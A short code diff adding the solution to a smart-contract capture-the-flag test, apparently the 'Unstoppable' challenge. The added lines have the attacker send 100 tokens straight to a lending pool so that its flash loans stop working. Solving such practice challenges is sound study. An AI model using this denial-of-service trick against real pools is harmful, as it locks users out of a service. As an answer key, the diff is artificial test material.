@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+         // Grief pool by preventing flash loans
+        await this.token.connect(attacker).transfer(this.pool.address, 100);    
     });
 
     after(async function () {
